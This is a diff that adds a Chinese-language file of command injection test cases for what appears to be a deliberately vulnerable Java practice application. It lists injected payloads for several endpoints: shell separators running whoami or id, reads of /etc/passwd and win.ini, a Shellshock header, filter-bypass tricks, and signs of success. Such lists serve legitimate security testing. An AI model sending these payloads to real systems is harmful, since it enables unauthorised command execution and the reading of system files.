@@ -1,0 +1,150 @@
+# Command Injection (命令注入) 漏洞测试用例
+
+# ============================================
+# 1. Runtime.exec 方式
+# ============================================
+# 端点: /cmd/runtime/vuln?filename={payload}
+
+# 正常请求
+filename=test.txt
+
+# Unix 分号分隔符
+filename=test.txt;whoami
+
+# Unix 分号分隔符 - 读取文件
+filename=test.txt;cat /etc/passwd
+
+# Unix 管道符
+filename=test.txt|id
+
+# Unix && 逻辑与
+filename=test.txt&&uname -a
+
+# Unix || 逻辑或
+filename=test.txt||ls -la
+
+# Unix 反引号命令替换
+filename=test.txt`whoami`
+
+# Unix $() 命令替换
+filename=test.txt$(whoami)
+
+# Unix 换行符注入
+filename=test.txt\ncat /etc/passwd
+
+
+# ============================================
+# 2. ProcessBuilder 方式
+# ============================================
+# 端点: /cmd/processbuilder/vuln?dir={payload}
+
+# 正常请求
+dir=/var/log
+
+# 分号注入 - 执行命令
+dir=/var/log;whoami
+
+# 分号注入 - 读取文件
+dir=/var/log;cat /etc/passwd
+
+# 管道注入
+dir=/var/log|id
+
+# && 注入
+dir=/var/log&&pwd
+
+# 反引号注入
+dir=/var/log`whoami`
+
+
+# ============================================
+# 3. Ping 命令注入
+# ============================================
+# 端点: /cmd/ping/vuln?host={payload}
+
+# 正常请求
+host=8.8.8.8
+
+# 分号注入
+host=8.8.8.8;whoami
+
+# 管道注入
+host=8.8.8.8|id
+
+# && 注入
+host=8.8.8.8&&uname
+
+# 后台执行
+host=8.8.8.8&whoami
+
+# 连续命令
+host=8.8.8.8;ls;pwd;whoami
+
+
+# ============================================
+# 4. HTTP Header 注入
+# ============================================
+# 端点: /cmd/header/vuln
+# 需要设置 Header: X-Command: {payload}
+
+# Header 分号注入
+X-Command: ;whoami
+
+# Header 管道注入
+X-Command: |id
+
+# Header 反引号注入
+X-Command: `uname -a`
+
+# Shellshock 注入 (CVE-2014-6271)
+User-Agent: () { :; }; echo; cat /etc/passwd
+
+
+# ============================================
+# 5. Windows 命令注入
+# ============================================
+
+# Windows & 分隔符
+filename=test.txt&whoami
+
+# Windows | 管道符
+filename=test.txt|type C:\Windows\win.ini
+
+# Windows && 逻辑与
+filename=test.txt&&dir
+
+# Windows || 逻辑或
+filename=test.txt||whoami
+
+
+# ============================================
+# 命令注入绕过技巧
+# ============================================
+# 空格绕过
+# - ${IFS}
+# - $IFS$9
+# - <>
+
+# 命令绕过
+# - whoa\mi
+# - w"h"o"a"m"i
+# - w''h''o''a''m''i
+
+# 编码绕过
+# - Base64 编码后解码执行
+# - 十六进制编码
+# - URL 编码
+
+# 混淆技巧
+# - 环境变量变量: ${PATH:0:1}
+# - 通配符: /???/?ss?
+
+
+# ============================================
+# 验证方法
+# ============================================
+# 成功的命令注入特征:
+# 1. 命令执行结果包含 "root" (whoami)
+# 2. 文件内容包含 /etc/passwd 的特征 (如 "root:x:0:0:")
+# 3. 系统信息泄露 (uname, id 命令输出)
+# 4. 命令执行延迟 (SLEEP, ping 等命令)
